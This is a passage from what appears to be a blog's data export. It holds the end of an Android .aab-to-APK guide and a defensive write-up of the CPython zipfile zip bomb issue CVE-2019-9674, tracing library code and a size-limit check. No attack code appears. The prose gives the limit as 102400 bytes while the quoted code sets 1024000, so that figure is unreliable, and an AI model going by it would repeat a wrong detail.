href=\"#How-to-build-an-“aab”-file-when-you-complete-your-project-by-yourself\" class=\"headerlink\" title=\"How to build an “aab” file when you complete your project by yourself\"></a>How to build an “aab” file when you complete your project by yourself</h2><p>Open Android Studio -&gt; Build -&gt; Build Bundle(s) &#x2F; APK(s) -&gt; Build Bundle(s)</p>\n<p><img src=\"https://i.imgur.com/3PXo5Ox.png\"></p>\n<p>The aab file will locate in:</p>\n<p><code>/Users/$USER/AndroidStudioProjects/Test/app/build/outputs/bundle/debug/app-debug.aab</code></p>\n<p>It is literally another kind of compressed file, and its directory after unzipping is as shown below.</p>\n<p><img src=\"https://i.imgur.com/B7PGHfm.png\"></p>\n<p>You may probably know, the crucial file <code>DEX</code> locate in the dex directory.</p>\n<h2 id=\"Convert-aab-to-apk-file\"><a href=\"#Convert-aab-to-apk-file\" class=\"headerlink\" title=\"Convert .aab to .apk file\"></a>Convert .aab to .apk file</h2><p>Using the command-line tool bundletool, you can convert aab files into APK files with just one command.</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">bundletool build-apks --bundle=app-debug.aab --output=my_app.apks</span><br></pre></td></tr></table></figure>\n\n<p>You may notice that the output of the APK is suffixed with “s”, which means it is a bunch of APK files in an archive.</p>\n<p><img src=\"https://i.imgur.com/YyqAX1r.png\"></p>\n<p>All of these APKs are generated based on a different language, screen size, etc. Now you can pick any of them to analyze as usual.</p>\n<p>Reference:<br><a href=\"https://developer.android.com/studio/command-line/bundletool\">https://developer.android.com/studio/command-line/bundletool</a></p>\n"},{"title":"CVE-2019-9674 Zip bomb vulnerability in CPython Lib/zipfile.py","date":"2021-09-30T08:39:10.000Z","_content":"\n# Background\n\nI reported a zip bomb vulnerability to the CPython community in 2019. Here are all the interesting resources and ideas.\n\n[Issue Discussion on BPO](https://bugs.python.org/issue36462)\n\n[CVE-2019-9674](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-9674)\n\n[Decompression pitfall I wrote for official documentation](https://docs.python.org/3/library/zipfile.html#decompression-pitfalls)\n\n[Pull Request related it](https://github.com/python/cpython/pull/13378)\n\n[PyCon Korea 2019 - Click Click Boom! Bombs Over Our Minds](https://www.youtube.com/watch?v=-S4JVQt6GX4&ab_channel=PyConKorea)\n\n# zipfile analysis\n\nAccording to Black Hat's  [Cara Marie](https://www.blackhat.com/docs/us-16/materials/us-16-Marie-I-Came-to-Drop-Bombs-Auditing-The-Compression-Algorithm-Weapons-Cache.pdf) research, there are some solutions against Zip Bomb. By limiting the size of the block to be read at a time, if there is still data remaining after the block that needs to be decompressed after reading this block, it is considered that it is possible to be a Zip Bomb.\n\nBelow is [Cara Marie](https://www.blackhat.com/docs/us-16/materials/us-16-Marie-I-Came-to-Drop-Bombs-Auditing-The-Compression-Algorithm-Weapons-Cache.pdf) code\n\n```python\nimport zlib\ndef decompress(data, maxsize=1024000):\n    dec = zlib.decompressobj()\n    data = dec.decompress(data, maxsize)\n    if dec.unconsumed_tail:\n        raise ValueError(\"Possible bomb\")\n    del dec\n    return data\n```\n\nAs you can see, the strategy to defeating the zip bomb is by limiting a block, in this case, is max size 102400. However, we take a look at the Python standard library, [zipfile](https://github.com/python/cpython/blob/3.9/Lib/zipfile.py).\n\n\n---\n\nAccording to Cara Marie's approach, we try to figure out the difference between zipfile and zlib and **why we can't use zipfile directly for preventing zip bombs**, so we started to study zipfile source code.\n\n\n# [zipfile](https://github.com/python/cpython/blob/master/Lib/zipfile.py)\n\nSince I focus on the zip format and pick the most commonly used algorithm, DEFLATED algorithm. Inside the zipfile, we can see the location of unzipped function, starting at line `702`, getting the zlib object, and finally returning the object.\n\n**[zlib.decompressobj(-15)](https://github.com/python/cpython/blob/f2320b37d9c85d8ddfc0c6afa81b77cd5f6e5ef2/Lib/zipfile.py#L702-L716)**\n\n\n```python\ndef _get_decompressor(compress_type):\n    if compress_type == ZIP_STORED:\n        return None\n    elif compress_type == ZIP_DEFLATED:\n        return zlib.decompressobj(-15)\n    elif compress_type == ZIP_BZIP2:\n        return bz2.BZ2Decompressor()\n    elif compress_type == ZIP_LZMA:\n        return LZMADecompressor()\n    else:\n        descr = compressor_names.get(compress_type)\n        if descr:\n            raise NotImplementedError(\"compression type %d (%s)\" % (compress_type, descr))\n        else:\n            raise NotImplementedError(\"compression type %d\" % (compress_type,))\n```\n\nFrom the above code, we can know that the zipfile is based on what zlib does. So we have to deep dive into what zlib did?\n\n# [zlib](https://docs.python.org/3/library/zlib.html)\n\nAccording to the zlib documentation\n\n> There are two ways to compression and decompression, .compress() and .decompress() will fit all files into memory at once. In contrast to the method of the object. It using .compressobj() and .decompressobj() which won’t fit into memory at once.\n\nThere are two ways to compress/decompress.\n\n1. .compress() and .decompress() will put the entire file into memory at a time\n2. .compressobj() and .decompressobj() separate the file , compress/decompress one block at a time\n\n---\n\nHowever, the official documentation does not clearly explain how to use the API to decompress files. The purpose of this method is to obtain the file data stream and decompress it through the Low-Level method. And we went back to the zipfile module and found that they had already done the decompression of zlib, so we planned to apply the patch for zipfile first.\n\nIn the way that zipfile belongs to `decompressobj`, we have the first way to accumulate chunks. As long as we can find out where to do the decompression of chunks, we accumulate it and give a threshold. If it exceeds, then consider that it is possible to be the zip bomb.\n\n\n# Get back at the zipfile\n\n1. Starting with the object\n\n[Line 706](https://github.com/python/cpython/blob/f2320b37d9c85d8ddfc0c6afa81b77cd5f6e5ef2/Lib/zipfile.py#L706)\n```python\nreturn zlib.decompressobj(-15)\n```\n\n[Line 791](https://github.com/python/cpython/blob/f2320b37d9c85d8ddfc0c6afa81b77cd5f6e5ef2/Lib/zipfile.py#L791)\n\nIt is the place where the class of zlib.decompressobj(-15) object is obtained and initialized.\n\n\nwhich belongs to ZipExtFile class\n```python\n    def __init__(self, fileobj, mode, zipinfo, decrypter=None,close_fileobj=False):\n```\n\nLet's find out what `fileobj` is\n\n[Line 1545](https://github.com/python/cpython/blob/f2320b37d9c85d8ddfc0c6afa81b77cd5f6e5ef2/Lib/zipfile.py#L1545)\n\n```python\nreturn ZipExtFile(zef_file, mode, zinfo, zd, True)\n```\n\nReturn the class, and use zef_file, then follow zef_file\n\n\n\n[Line 719](https://github.com/python/cpython/blob/f2320b37d9c85d8ddfc0c6afa81b77cd5f6e5ef2/Lib/zipfile.py#L719)\n\n_SharedFile being initialized\n\n```python\n    def __init__(self, file, pos, close, lock, writing):\n```\n\nHere we know that when zlib is decompressed, you can't start decompressing directly to Streaming, and you need to skip the file encoding in front of the zip file.\n\n[Line 759](https://github.com/python/cpython/blob/f2320b37d9c85d8ddfc0c6afa81b77cd5f6e5ef2/Lib/zipfile.py#L759)\n\nIn class _Tellable: to initialize the position of the indicator that gets the file descriptor\n```python\n    def __init__(self, fp):\n        self.fp = fp\n        self.offset = 0\n```\n\nand then\n\n[Line 977](https://github.com/python/cpython/blob/f2320b37d9c85d8ddfc0c6afa81b77cd5f6e5ef2/Lib/zipfile.py#L977-L984)\n\n\n```python\n\n        elif self._compress_type == ZIP_DEFLATED:\n            n = max(n, self.MIN_READ_SIZE)\n            data = self._decompressor.decompress(data, n)\n            self._eof = (self._decompressor.eof or\n                         self._compress_left <= 0 and\n                         not self._decompressor.unconsumed_tail)\n            if self._eof:\n                data += self._decompressor.flush()\n\n```\n\nWe observed that after choosing to use the ZIP_DEFLATED compression algorithm, we did a function max to get n.\n\n# Key Point\n```python\nmax(n, self.MIN_READ_SIZE)\n```\n\nWhen you use zlib.decompressobj as a block, how big is your block?\n, self.MIN_READ_SIZE is preset to 4096 bytes, which is the size of a page in the operating system.\n\n## Cara Marie's solution\n\n```python\nimport zlib\ndef decompress(data, maxsize=1024000):\n    dec = zlib.decompressobj()\n    data = dec.decompress(data, maxsize)\n    if dec.unconsumed_tail:\n        raise ValueError(\"Possible bomb\")\n    del dec\n    return data\n```\n\n## It sets maxsize to 102400 bytes\n\nAccording to the official document\n\n> Decompress.decompress(data, max_length=0)\n> Decompress data, returning a bytes object containing the uncompressed data corresponding to at least part of the data in the string. This data should be concatenated to the output produced by any preceding calls to the decompress() method. Some of the input data may be preserved in internal buffers for later processing.\n>\n> If the optional parameter max_length is non-zero then the return value will be no longer than max_length. This may mean that not all of the compressed input can be processed, and unconsumed data will be stored in the attribute unconsumed_tail. This byte string must be passed to a subsequent call to decompress() if decompression is to continue. If max_length is zero then the whole input is decompressed, and unconsumed_tail is empty.\n>\n> Changed in version 3.6: max_length can be used as a keyword argument.\n\n\nMax_length represents the file block size that can be read into the memory at a time and is marked with unconsumed_tail to see if any remaining files need to be decompressed.\n\nTherefore, his idea is more than 102400 bytes. If there is any remaining data, it means there may be a zip bomb.\n\n![](https://i.imgur.com/7schHy0.png)\n\n","source":"_posts/CPython-zipfile-Code-Tracing.md","raw":"---\ntitle: [CVE-2019-9674 Zip bomb vulnerability in CPython Lib/zipfile.py]\ndate: 2021-09-30 16:39:10\ntags:\n- vulnerability\n- python\n---\n\n# Background\n\nI reported a zip bomb vulnerability to the CPython community in 2019. Here are all the interesting resources and ideas.\n\n[Issue Discussion on BPO](https://bugs.python.org/issue36462)\n\n[CVE-2019-9674](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-9674)\n\n[Decompression pitfall I wrote for official documentation](https://docs.python.org/3/library/zipfile.html#decompression-pitfalls)\n\n[Pull Request related it](https://github.com/python/cpython/pull/13378)\n\n[PyCon Korea 2019 - Click Click Boom! Bombs Over Our Minds](https://www.youtube.com/watch?v=-S4JVQt6GX4&ab_channel=PyConKorea)\n\n# zipfile analysis\n\nAccording to Black Hat's  [Cara Marie](https://www.blackhat.com/docs/us-16/materials/us-16-Marie-I-Came-to-Drop-Bombs-Auditing-The-Compression-Algorithm-Weapons-Cache.pdf) research, there are some solutions against Zip Bomb. By limiting the size of the block to be read at a time, if there is still data remaining after the block that needs to be decompressed after reading this block, it is considered that it is possible to be a Zip Bomb.\n\nBelow is [Cara Marie](https://www.blackhat.com/docs/us-16/materials/us-16-Marie-I-Came-to-Drop-Bombs-Auditing-The-Compression-Algorithm-Weapons-Cache.pdf) code\n\n```python\nimport zlib\ndef decompress(data, maxsize=1024000):\n    dec = zlib.decompressobj()\n    data = dec.decompress(data, maxsize)\n    if dec.unconsumed_tail:\n        raise ValueError(\"Possible bomb\")\n    del dec\n    return data\n```\n\nAs you can see, the strategy to defeating the zip bomb is by limiting a block, in this case, is max size 102400. However, we take a look at the Python standard library, [zipfile](https://github.com/python/cpython/blob/3.9/Lib/zipfile.py).\n\n\n---\n\nAccording to Cara Marie's approach, we try to figure out the difference between zipfile and zlib and **why we can't use zipfile directly for preventing zip bombs**, so we started to study zipfile source code.\n\n\n# [zipfile](https://github.com/python/cpython/blob/master/Lib/zipfile.py)\n\nSince I focus on the zip format and pick the most commonly used algorithm, DEFLATED algorithm. Inside the zipfile, we can see the location of unzipped function, starting at line `702`, getting the zlib object, and finally returning the object.\n\n**[zlib.decompressobj(-15)](https://github.com/python/cpython/blob/f2320b37d9c85d8ddfc0c6afa81b77cd5f6e5ef2/Lib/zipfile.py#L702-L716)**\n\n\n```python\ndef _get_decompressor(compress_type):\n    if compress_type == ZIP_STORED:\n        return None\n    elif compress_type == ZIP_DEFLATED:\n        return zlib.decompressobj(-15)\n    elif compress_type == ZIP_BZIP2:\n        return bz2.BZ2Decompressor()\n    elif compress_type == ZIP_LZMA:\n        return LZMADecompressor()\n    else:\n        descr = compressor_names.get(compress_type)\n        if descr:\n            raise NotImplementedError(\"compression type %d (%s)\" % (compress_type, descr))\n        else:\n            raise NotImplementedError(\"compression type %d\" % (compress_type,))\n```\n\nFrom the above code, we can know that the zipfile is based on what zlib does. So we have to deep dive into what zlib did?\n\n# [zlib](https://docs.python.org/3/library/zlib.html)\n\nAccording to the zlib documentation\n\n> There are two ways to compression and decompression, .compress() and .decompress() will fit all files into memory at once. In contrast to the method of the object. It using .compressobj() and .decompressobj() which won’t fit into memory at once.\n\nThere are two ways to compress/decompress.\n\n1. .compress() and .decompress() will put the entire file into memory at a time\n2. .compressobj() and .decompressobj() separate the file , compress/decompress one block at a time\n\n---\n\nHowever, the official documentation does not clearly explain how to use the API to decompress files. The purpose of this method is to obtain the file data stream and decompress it through the Low-Level method. And we went back to the zipfile module and found that they had already done the decompression of zlib, so we planned to apply the patch for zipfile first.\n\nIn the way that zipfile belongs to `decompressobj`, we have the first way to accumulate chunks. As long as we can find out where to do the decompression of chunks, we accumulate it and give a threshold. If it exceeds, then consider that it is possible to be the zip bomb.\n\n\n# Get back at the zipfile\n\n1. Starting with the object\n\n[Line 706](https://github.com/python/cpython/blob/f2320b37d9c85d8ddfc0c6afa81b77cd5f6e5ef2/Lib/zipfile.py#L706)\n```python\nreturn zlib.decompressobj(-15)\n```\n\n[Line 791](https://github.com/python/cpython/blob/f2320b37d9c85d8ddfc0c6afa81b77cd5f6e5ef2/Lib/zipfile.py#L791)\n\nIt is the place where the class of zlib.decompressobj(-15) object is obtained and initialized.\n\n\nwhich belongs to ZipExtFile class\n```python\n    def __init__(self, fileobj, mode, zipinfo, decrypter=None,close_fileobj=False):\n```\n\nLet's find out what `fileobj` is\n\n[Line 1545](https://github.com/python/cpython/blob/f2320b37d9c85d8ddfc0c6afa81b77cd5f6e5ef2/Lib/zipfile.py#L1545)\n\n```python\nreturn ZipExtFile(zef_file, mode, zinfo, zd, True)\n```\n\nReturn the class, and use zef_file, then follow zef_file\n\n\n\n[Line 719](https://github.com/python/cpython/blob/f2320b37d9c85d8ddfc0c6afa81b77cd5f6e5ef2/Lib/zipfile.py#L719)\n\n_SharedFile being initialized\n\n```python\n    def __init__(self, file, pos, close, lock, writing):\n```\n\nHere we know that when zlib is decompressed, you can't start decompressing directly to Streaming, and you need to skip the file encoding in front of the zip file.\n\n[Line 759](https://github.com/python/cpython/blob/f2320b37d9c85d8ddfc0c6afa81b77cd5f6e5ef2/Lib/zipfile.py#L759)\n\nIn class _Tellable: to initialize the position of the indicator that gets the file descriptor\n```python\n    def __init__(self, fp):\n        self.fp = fp\n        self.offset = 0\n```\n\nand then\n\n[Line 977](https://github.com/python/cpython/blob/f2320b37d9c85d8ddfc0c6afa81b77cd5f6e5ef2/Lib/zipfile.py#L977-L984)\n\n\n```python\n\n        elif self._compress_type == ZIP_DEFLATED:\n            n = max(n, self.MIN_READ_SIZE)\n            data = self._decompressor.decompress(data, n)\n            self._eof = (self._decompressor.eof or\n                         self._compress_left <= 0 and\n                         not self._decompressor.unconsumed_tail)\n            if self._eof:\n                data += self._decompressor.flush()\n\n```\n\nWe observed that after choosing to use the ZIP_DEFLATED compression algorithm, we did a function max to get n.\n\n# Key Point\n```python\nmax(n, self.MIN_READ_SIZE)\n```\n\nWhen you use zlib.decompressobj as a block, how big is your block?\n, self.MIN_READ_SIZE is preset to 4096 bytes, which is the size of a page in the operating system.\n\n## Cara Marie's solution\n\n```python\nimport zlib\ndef decompress(data, maxsize=1024000):\n    dec = zlib.decompressobj()\n    data = dec.decompress(data, maxsize)\n    if dec.unconsumed_tail:\n        raise ValueError(\"Possible bomb\")\n    del dec\n    return data\n```\n\n## It sets maxsize to 102400 bytes\n\nAccording to the official document\n\n> Decompress.decompress(data, max_length=0)\n> Decompress data, returning a bytes object containing the uncompressed data corresponding to at least part of the data in the string. This data should be concatenated to the output produced by any preceding calls to the decompress() method. Some of the input data may be preserved in internal buffers for later processing.\n>\n> If the optional parameter max_length is non-zero then the return value will be no longer than max_length. This may mean that not all of the compressed input can be processed, and unconsumed data will be stored in the attribute unconsumed_tail. This byte string must be passed to a subsequent call to decompress() if decompression is to continue. If max_length is zero then the whole input is decompressed, and unconsumed_tail is empty.\n>\n> Changed in version 3.6: max_length can be used as a keyword argument.\n\n\nMax_length represents the file block size that can be read into the memory at a time and is marked with unconsumed_tail to see if any remaining files need to be decompressed.\n\nTherefore, his idea is more than 102400 bytes. If there is any remaining data, it means there may be a zip bomb.\n\n![](https://i.imgur.com/7schHy0.png)\n\n","slug":"CPython-zipfile-Code-Tracing","published":1,"updated":"2023-04-20T07:41:28.340Z","comments":1,"layout":"post","photos":[],"link":"","_id":"clgotepmk0003i7rie5936w18","content":"<h1 id=\"Background\"><a href=\"#Background\" class=\"headerlink\" title=\"Background\"></a>Background</h1><p>I reported a zip bomb vulnerability to the CPython community in 2019. Here are all the interesting resources and ideas.</p>\n<p><a href=\"https://bugs.python.org/issue36462\">Issue Discussion on BPO</a></p>\n<p><a href=\"https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-9674\">CVE-2019-9674</a></p>\n<p><a href=\"https://docs.python.org/3/library/zipfile.html#decompression-pitfalls\">Decompression pitfall I wrote for official documentation</a></p>\n<p><a href=\"https://github.com/python/cpython/pull/13378\">Pull Request related it</a></p>\n<p><a href=\"https://www.youtube.com/watch?v=-S4JVQt6GX4&ab_channel=PyConKorea\">PyCon Korea 2019 - Click Click Boom! Bombs Over Our Minds</a></p>\n<h1 id=\"zipfile-analysis\"><a href=\"#zipfile-analysis\" class=\"headerlink\" title=\"zipfile analysis\"></a>zipfile analysis</h1><p>According to Black Hat’s  <a href=\"https://www.blackhat.com/docs/us-16/materials/us-16-Marie-I-Came-to-Drop-Bombs-Auditing-The-Compression-Algorithm-Weapons-Cache.pdf\">Cara Marie</a> research, there are some solutions against Zip Bomb. By limiting the size of the block to be read at a time, if there is still data remaining after the block that needs to be decompressed after reading this block, it is considered that it is possible to be a Zip Bomb.</p>\n<p>Below is <a href=\"https://www.blackhat.com/docs/us-16/materials/us-16-Marie-I-Came-to-Drop-Bombs-Auditing-The-Compression-Algorithm-Weapons-Cache.pdf\">Cara Marie</a> code</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> zlib</span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">decompress</span>(<span class=\"params\">data, maxsize=<span class=\"number\">1024000</span></span>):</span><br><span class=\"line\">    dec = zlib.decompressobj()</span><br><span class=\"line\">    data = dec.decompress(data, maxsize)</span><br><span class=\"line\">    <span class=\"keyword\">if</span> dec.unconsumed_tail:</span><br><span class=\"line\">        <span class=\"keyword\">raise</span> ValueError(<span class=\"string\">&quot;Possible bomb&quot;</span>)</span><br><span class=\"line\">    <span class=\"keyword\">del</span> dec</span><br><span class=\"line\">    <span class=\"keyword\">return</span> data</span><br></pre></td></tr></table></figure>\n\n<p>As you can see, the strategy to defeating the zip bomb is by limiting a block, in this case, is max size 102400. However, we take a look at the Python standard library, <a href=\"https://github.com/python/cpython/blob/3.9/Lib/zipfile.py\">zipfile</a>.</p>\n<hr>\n<p>According to Cara Marie’s approach, we try to figure out the difference between zipfile and zlib and <strong>why we can’t use zipfile directly for preventing zip bombs</strong>, so we started to study zipfile source code.</p>\n<h1 id=\"zipfile\"><a href=\"#zipfile\" class=\"headerlink\" title=\"zipfile\"></a><a href=\"https://github.com/python/cpython/blob/master/Lib/zipfile.py\">zipfile</a></h1><p>Since I focus on the zip format and pick the most commonly used algorithm, DEFLATED algorithm. Inside the zipfile, we can see the location of unzipped function, starting at line <code>702</code>, getting the zlib object, and finally returning the object.</p>\n<p><strong><a href=\"https://github.com/python/cpython/blob/f2320b37d9c85d8ddfc0c6afa81b77cd5f6e5ef2/Lib/zipfile.py#L702-L716\">zlib.decompressobj(-15)</a></strong></p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">_get_decompressor</span>(<span class=\"params\">compress_type</span>):</span><br><span class=\"line\">    <span class=\"keyword\">if</span> compress_type == ZIP_STORED:</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"literal\">None</span></span><br><span class=\"line\">    <span class=\"keyword\">elif</span> compress_type == ZIP_DEFLATED:</span><br><span class=\"line\">        <span class=\"keyword\">return</span> zlib.decompressobj(-<span class=\"number\">15</span>)</span><br><span class=\"line\">    <span class=\"keyword\">elif</span> compress_type == ZIP_BZIP2:</span><br><span class=\"line\">        <span class=\"keyword\">return</span> bz2.BZ2Decompressor()</span><br><span class=\"line\">    <span class=\"keyword\">elif</span> compress_type == ZIP_LZMA:</span><br><span class=\"line\">        <span class=\"keyword\">return</span> LZMADecompressor()</span><br><span class=\"line\">    <span class=\"keyword\">else</span>:</span><br><span class=\"line\">        descr = compressor_names.get(compress_type)</span><br><span class=\"line\">        <span class=\"keyword\">if</span> descr:</span><br><span class=\"line\">            <span class=\"keyword\">raise</span> NotImplementedError(<span class=\"string\">&quot;compression type %d (%s)&quot;</span> % (compress_type, descr))</span><br><span class=\"line\">        <span class=\"keyword\">else</span>:</span><br><span class=\"line\">            <span class=\"keyword\">raise</span> NotImplementedError(<span class=\"string\">&quot;compression type %d&quot;</span> % (compress_type,))</span><br></pre></td></tr></table></figure>\n\n<p>From the above code, we can know that the zipfile is based on what zlib does. So we have to deep dive into what zlib did?</p>\n<h1 id=\"zlib\"><a href=\"#zlib\" class=\"headerlink\" title=\"zlib\"></a><a href=\"https://docs.python.org/3/library/zlib.html\">zlib</a></h1><p>According to the zlib documentation</p>\n<blockquote>\n<p>There are two ways to compression and decompression, .compress() and .decompress() will fit all files into memory at once. In contrast to the method of the object. It using .compressobj() and .decompressobj() which won’t fit into memory at once.</p>\n</blockquote>\n<p>There are two ways to compress&#x2F;decompress.</p>\n<ol>\n<li>.compress() and .decompress() will put the entire file into memory at a time</li>\n<li>.compressobj() and .decompressobj() separate the file , compress&#x2F;decompress one block at a time</li>\n</ol>\n<hr>\n<p>However, the official documentation does not clearly explain how to use the API to decompress files. The purpose of this method is to obtain the file data stream and decompress it through the Low-Level method. And we went back to the zipfile module and found that they had already done the decompression of zlib, so we planned to apply the patch for zipfile first.</p>\n<p>In the way that zipfile belongs to <code>decompressobj</code>, we have the first way to accumulate chunks. As long as we can find out where to do the decompression of chunks, we accumulate it and give a threshold. If it exceeds, then consider that it is possible to be the zip bomb.</p>\n<h1 id=\"Get-back-at-the-zipfile\"><a href=\"#Get-back-at-the-zipfile\" class=\"headerlink\" title=\"Get back at the zipfile\"></a>Get back at the zipfile</h1><ol>\n<li>Starting with the object</li>\n</ol>\n<p><a href=\"https://github.com/python/cpython/blob/f2320b37d9c85d8ddfc0c6afa81b77cd5f6e5ef2/Lib/zipfile.py#L706\">Line 706</a></p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">return</span> zlib.decompressobj(-<span class=\"number\">15</span>)</span><br></pre></td></tr></table></figure>\n\n<p><a href=\"https://github.com/python/cpython/blob/f2320b37d9c85d8ddfc0c6afa81b77cd5f6e5ef2/Lib/zipfile.py#L791\">Line 791</a></p>\n<p>It is the place where the class of zlib.decompressobj(-15) object is obtained and initialized.</p>\n<p>which belongs to ZipExtFile class</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">__init__</span>(<span class=\"params\">self, fileobj, mode, zipinfo, decrypter=<span class=\"literal\">None</span>,close_fileobj=<span class=\"literal\">False</span></span>):</span><br></pre></td></tr></table></figure>\n\n<p>Let’s find out what <code>fileobj</code> is</p>\n<p><a href=\"https://github.com/python/cpython/blob/f2320b37d9c85d8ddfc0c6afa81b77cd5f6e5ef2/Lib/zipfile.py#L1545\">Line 1545</a></p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">return</span> ZipExtFile(zef_file, mode, zinfo, zd, <span class=\"literal\">True</span>)</span><br></pre></td></tr></table></figure>\n\n<p>Return the class, and use zef_file, then follow zef_file</p>\n<p><a href=\"https://github.com/python/cpython/blob/f2320b37d9c85d8ddfc0c6afa81b77cd5f6e5ef2/Lib/zipfile.py#L719\">Line 719</a></p>\n<p>_SharedFile being initialized</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">__init__</span>(<span class=\"params\">self, file, pos, close, lock, writing</span>):</span><br></pre></td></tr></table></figure>\n\n<p>Here we know that when zlib is decompressed, you can’t start decompressing directly to Streaming, and you need to skip the file encoding in front of the zip file.</p>\n<p><a href=\"https://github.com/python/cpython/blob/f2320b37d9c85d8ddfc0c6afa81b77cd5f6e5ef2/Lib/zipfile.py#L759\">Line 759</a></p>\n<p>In class _Tellable: to initialize the position of the indicator that gets the file descriptor</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">__init__</span>(<span class=\"params\">self, fp</span>):</span><br><span class=\"line\">    self.fp = fp</span><br><span class=\"line\">    self.offset = <span class=\"number\">0</span></span><br></pre></td></tr></table></figure>\n\n<p>and then</p>\n<p><a href=\"https://github.com/python/cpython/blob/f2320b37d9c85d8ddfc0c6afa81b77cd5f6e5ef2/Lib/zipfile.py#L977-L984\">Line 977</a></p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">elif</span> self._compress_type == ZIP_DEFLATED:</span><br><span class=\"line\">    n = <span class=\"built_in\">max</span>(n, self.MIN_READ_SIZE)</span><br><span class=\"line\">    data = self._decompressor.decompress(data, n)</span><br><span class=\"line\">    self._eof = (self._decompressor.eof <span class=\"keyword\">or</span></span><br><span class=\"line\">                 self._compress_left &lt;= <span class=\"number\">0</span> <span class=\"keyword\">and</span></span><br><span class=\"line\">                 <span class=\"keyword\">not</span> self._decompressor.unconsumed_tail)</span><br><span class=\"line\">    <span class=\"keyword\">if</span> self._eof:</span><br><span class=\"line\">        data += self._decompressor.flush()</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<p>We observed that after choosing to use the ZIP_DEFLATED compression algorithm, we did a function max to get n.</p>\n<h1 id=\"Key-Point\"><a href=\"#Key-Point\" class=\"headerlink\" title=\"Key Point\"></a>Key Point</h1><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"built_in\">max</span>(n, self.MIN_READ_SIZE)</span><br></pre></td></tr></table></figure>\n\n<p>When you use zlib.decompressobj as a block, how big is your block?<br>, self.MIN_READ_SIZE is preset to 4096 bytes, which is the size of a page in the operating system.</p>\n<h2 id=\"Cara-Marie’s-solution\"><a href=\"#Cara-Marie’s-solution\" class=\"headerlink\" title=\"Cara Marie’s solution\"></a>Cara Marie’s solution</h2><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> zlib</span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">decompress</span>(<span class=\"params\">data, maxsize=<span class=\"number\">1024000</span></span>):</span><br><span class=\"line\">    dec = zlib.decompressobj()</span><br><span class=\"line\">    data = dec.decompress(data, maxsize)</span><br><span class=\"line\">    <span class=\"keyword\">if</span> dec.unconsumed_tail:</span><br><span class=\"line\">        <span class=\"keyword\">raise</span> ValueError(<span class=\"string\">&quot;Possible bomb&quot;</span>)</span><br><span class=\"line\">    <span class=\"keyword\">del</span> dec</span><br><span class=\"line\">    <span class=\"keyword\">return</span> data</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"It-sets-maxsize-to-102400-bytes\"><a href=\"#It-sets-maxsize-to-102400-bytes\" class=\"headerlink\" title=\"It sets maxsize to 102400 bytes\"></a>It sets maxsize to 102400 bytes</h2><p>According to the official document</p>\n<blockquote>\n<p>Decompress.decompress(data, max_length&#x3D;0)<br>Decompress data, returning a bytes object containing the uncompressed data corresponding to at least part of the data in the string. This data should be concatenated to the output produced by any preceding calls to the decompress() method. Some of the input data may be preserved in internal buffers for later processing.</p>\n<p>If the optional parameter max_length is non-zero then the return value will be no longer than max_length. This may mean that not all of the compressed input can be processed, and unconsumed data will be stored in the attribute unconsumed_tail. This byte string must be passed to a subsequent call to decompress() if decompression is to continue. If max_length is zero then the whole input is decompressed, and unconsumed_tail is 